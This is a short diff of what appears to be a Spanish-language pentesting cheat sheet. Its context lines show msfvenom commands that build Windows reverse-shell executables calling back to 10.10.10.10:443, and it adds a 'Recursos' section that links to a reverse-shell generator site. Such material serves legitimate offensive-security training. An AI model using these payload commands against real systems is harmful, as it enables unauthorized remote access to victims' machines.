@@ -225,3 +225,6 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > r
 
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > reverse.exe
 ```
+
+### Recursos
+https://www.revshells.com
